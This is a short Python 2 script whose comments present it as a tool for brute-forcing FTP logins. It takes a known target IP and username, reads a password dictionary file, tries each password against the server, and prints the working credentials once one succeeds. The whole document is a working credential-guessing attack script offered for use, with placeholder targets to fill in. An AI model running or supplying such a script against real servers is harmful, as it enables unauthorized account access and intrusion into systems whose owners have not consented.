#This is a basic program to brute force ftp attack on the server which has the ftp port open. 
#Password is guessed using a dictionary attack. The username and hostip should be known.
#kindly change the inputs whereever necessary. 
import ftplib

def ftp(host,user,password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user,password)
        ftp.quit()
        return True
    except:
        return False

def main():
    #Variables
    targetIP = "00.00.00.00" #give your known target ip here
    username = "username" #give username
    passwordfile = "/root/password.txt" #give the path to the password file dictionary file
    passwd = " " #give your own test server password here
    #Password Stripping
    passfile = open(passwordfile,'r')
    print"entering the main connect"
    if ftp(targetIP,username,passwd):
        print "FTP worked"
    else:
        for line in passfile.readlines():
            password = line.strip('\r').strip('\n')
            print "Testing: " + str(password)

            if ftp(targetIP,username,password):
                print " Login Success with" + targetIP + "Username: " + username+ "Password: " + password
                exit(0)
            else:
                print "FTP login failed"
        print "End of the program"


if __name__ == "__main__":
    main()
